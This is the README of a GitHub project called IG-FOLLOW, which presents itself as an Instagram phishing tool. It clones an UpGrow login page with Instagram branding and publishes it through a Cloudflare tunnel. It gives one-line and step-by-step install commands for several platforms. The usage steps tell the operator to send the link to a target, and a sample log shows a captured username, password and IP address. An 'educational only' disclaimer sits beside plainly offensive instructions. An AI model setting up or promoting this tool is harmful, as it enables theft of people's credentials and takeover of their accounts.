# IG-FOLLOW

<p align="center">
  <img src="https://github.com/shahid2005a/IG-FOLLOW/blob/main/INSTAGRAM/Follower.png" width="180" alt="IG-FOLLOW Logo" />
</p>

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=30&duration=3000&pause=500&color=F7005C&center=true&vCenter=true&width=500&lines=Instagram+Phishing+Tool;Cloudflare+Tunnel+Powered;By+Aryan+Afridi" alt="Typing SVG" />
</p>

<p align="center">
  <!-- Advanced Badges -->
  <img src="https://img.shields.io/github/stars/shahid2005a/IG-FOLLOW?style=for-the-badge&logo=github&color=yellow" />
  <img src="https://img.shields.io/github/forks/shahid2005a/IG-FOLLOW?style=for-the-badge&logo=github&color=blue" />
  <img src="https://img.shields.io/github/issues/shahid2005a/IG-FOLLOW?style=for-the-badge&logo=github&color=red" />
  <br />
  <img src="https://img.shields.io/badge/Python-3.6%2B-blue?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS%20%7C%20Termux-brightgreen?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Tunnel-Cloudflare-orange?style=for-the-badge&logo=cloudflare" />
  <img src="https://img.shields.io/badge/License-Educational%20Only-red?style=for-the-badge" />
  <br />
  <img src="https://img.shields.io/badge/Made%20with-%E2%9D%A4%EF%B8%8F-ff69b4?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Version-2.0-important?style=for-the-badge" />
</p>

<p align="center">
  <b>🚀 Steal Instagram credentials via a realistic UpGrow login clone with Cloudflare Tunnel.</b>
</p>

---

## ⚠️ SHORT & CLEAR WARNING

> [!CAUTION]
> **This tool is strictly for Educational & Authorized Security Testing.**  
> You **MUST** obtain written permission before using it on any account.  
> Unauthorized access is **illegal** (IT Act, GDPR, CFAA).  
> **Developer (Aryan Afridi)** is **not liable** for any misuse. Proceed at your own risk.

---

## 📖 Table of Contents

- [✨ Features](#-features)
- [⚙️ Prerequisites](#️-prerequisites)
- [📥 Installation & Setup](#-installation--setup)
  - [🚀 Quick Install (Termux - Single Command)](#-quick-install-termux---single-command)
  - [📱 Termux (Step-by-Step)](#-termux-android-step-by-step)
  - [🪟 Windows](#-windows)
  - [🐧 Linux (Debian/Kali/Ubuntu)](#-linux-debiankaliubuntu)
  - [🍎 macOS](#-macos)
- [▶️ Usage](#️-usage)
- [📊 Logs](#-logs)
- [🛠️ Troubleshooting](#️-troubleshooting)
- [🌐 Connect with DGTL Cyber](#-connect-with-dgtl-cyber)
- [👨‍💻 Developer](#-developer)

---

## ✨ Features

- 🎯 **Realistic UI** – Clones the UpGrow website with Instagram branding.
- 🔒 **Cloudflare Tunnel** – Generates a public HTTPS link (no port forwarding required).
- 📱 **Cross-Platform** – Works on Termux, Windows, Linux, and macOS.
- 📂 **Auto Logging** – Saves credentials with timestamps & IPs to `data.log`.
- 🖥️ **Interactive Menu** – Simple CLI to start server or view logs.
- 📋 **Auto Copy URL** – Copies the phishing link to your clipboard automatically.
- ⚡ **One-Line Install** – Termux users can install and run with a single command.

---

## ⚙️ Prerequisites

- **Python 3.6** or higher installed.
- **Pip** package manager.
- **Git** (optional, for cloning).
- **Internet connection** (to download Cloudflared).

---

## 📥 Installation & Setup

### 🚀 Quick Install (Termux - Single Command)

> Copy and paste this single command in Termux to install everything automatically.

```bash
pkg update && pkg upgrade -y && termux-setup-storage && pkg install cloudflared python git openssl-tool -y && pip install pyperclip && rm -rf IG-FOLLOW && git clone https://github.com/shahid2005a/IG-FOLLOW.git && cd IG-FOLLOW && python main.py
```

---

📱 Termux (Android) - Step by Step

Open Termux and run these commands one by one.

```bash
# 1. Update packages
pkg update && pkg upgrade -y

# 2. Setup storage permission
termux-setup-storage

# 3. Install required packages
pkg install python git wget openssl-tool cloudflared cloudflared-tunnel -y

# 4. Install Python dependencies
pkg install python-pip -y
pip install pyperclip

# 5. Clone the repository
git clone https://github.com/shahid2005a/IG-FOLLOW.git

# 6. Navigate to the folder
cd IG-FOLLOW

# 7. Run the tool
python main.py
```

---

🪟 Windows

Use Command Prompt (Admin) or PowerShell.

```powershell
# 1. Download & install Python from https://python.org (Make sure to Add to PATH)

# 2. Open CMD as Administrator and run:

# Upgrade pip
python -m pip install --upgrade pip

# Install pyperclip (optional)
pip install pyperclip

# Clone the repo (if Git is installed)
git clone https://github.com/shahid2005a/IG-FOLLOW.git
cd IG-FOLLOW

# OR simply paste the script in a folder (e.g., C:\phishing)

# Run the script
python main.py
```

⚠️ Note: If Cloudflared fails to download automatically, download cloudflared-windows-amd64.exe from Cloudflared Releases, rename it to cloudflared.exe and place it in the same folder as the script.

---

🐧 Linux (Debian/Kali/Ubuntu)

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Python, Git & Cloudflared
sudo apt install python3 python3-pip git cloudflared -y

# Upgrade pip
pip3 install --upgrade pip

# Install pyperclip (optional)
pip3 install pyperclip

# Clone the repo
git clone https://github.com/shahid2005a/IG-FOLLOW.git
cd IG-FOLLOW

# Give execute permission
chmod +x main.py

# Run the tool
python3 main.py
```

---

🍎 macOS

```bash
# Install Homebrew (if not installed)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install Python, Git & Cloudflared
brew install python3 git cloudflared

# Upgrade pip
pip3 install --upgrade pip

# Install pyperclip (optional)
pip3 install pyperclip

# Clone the repo
git clone https://github.com/shahid2005a/IG-FOLLOW.git
cd IG-FOLLOW

# Give execute permission
chmod +x main.py

# Run the tool
python3 main.py
```

---

▶️ Usage

1. Run the script: python main.py (or python3 on Linux/macOS).
2. Select Option 1 from the menu to start the phishing server.
3. The script will automatically:
   · Start a local HTTP server on a free port (8000–8100).
   · Launch Cloudflare Tunnel and generate a public URL.
4. Copy the https://...trycloudflare.com URL shown on screen.
5. Share this link with your target.
6. Once they enter credentials, they are saved instantly.

---

📊 Logs

All captured data is stored in data.log with the following format:

```log
===========================================
[New Instagram Login] - 2026-06-27 14:30:22
Username/Email: victim@email.com
Password: SecretPass123
Package: 10k
IP: 192.168.1.100
User-Agent: Mozilla/5.0 ...
===========================================
```

To view logs:

· From the main menu, select Option 2.
· Or manually: cat data.log (Linux/macOS) / type data.log (Windows).

---

🛠️ Troubleshooting

Issue Solution
ModuleNotFoundError: No module named 'pyperclip' Ignore it or run pip install pyperclip.
Cloudflared download fails Download manually from releases and place in script folder.
Port already in use Script auto-finds the next free port (8000–8100).
Permission denied (Linux/macOS) Run chmod +x main.py and chmod +x cloudflared.
Tunnel URL not showing Wait 10–15 seconds; if still fails, run cloudflared tunnel --url http://localhost:8000 manually.
Termux: pkg install cloudflared not found Use the script's auto-download feature, or install manually from GitHub releases and place in $PREFIX/bin.

---

🌐 Connect with DGTL CYBER

Join the Ultimate Cyber Security Family. Stay Updated. Stay Secure. 🔵

<div align="center">
  <a href="https://dgtlcyber.netlify.app/">
    <img src="https://img.shields.io/badge/Official%20Website-DGTL%20CYBER-2ea44f?style=for-the-badge&logo=link&logoColor=white" />
  </a>
  <br><br>
  <a href="https://www.youtube.com/@aryanafridi00">
    <img src="https://img.shields.io/badge/YouTube-Aryan%20Afridi-FF0000?style=for-the-badge&logo=youtube&logoColor=white" />
  </a>
  <br><br>
  <a href="https://t.me/GsmhackerBot">
    <img src="https://img.shields.io/badge/Telegram-Bot-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" />
  </a>
  <br><br>
  

---

👨‍💻 Developer

<p align="left">
  <b>Aryan Afridi</b><br />
  <a href="https://github.com/shahid2005a"><img src="https://img.shields.io/badge/GitHub-181717?style=flat&logo=github" /></a>
  <a href="mailto:digitlcyber780@gmail.com"><img src="https://img.shields.io/badge/Email-D14836?style=flat&logo=gmail" /></a>
</p>

---

<p align="center">
  <b>⭐ If you found this useful, give it a star!</b><br />
  <i>Made with ❤️ for the cybersecurity community</i>
</p>
```
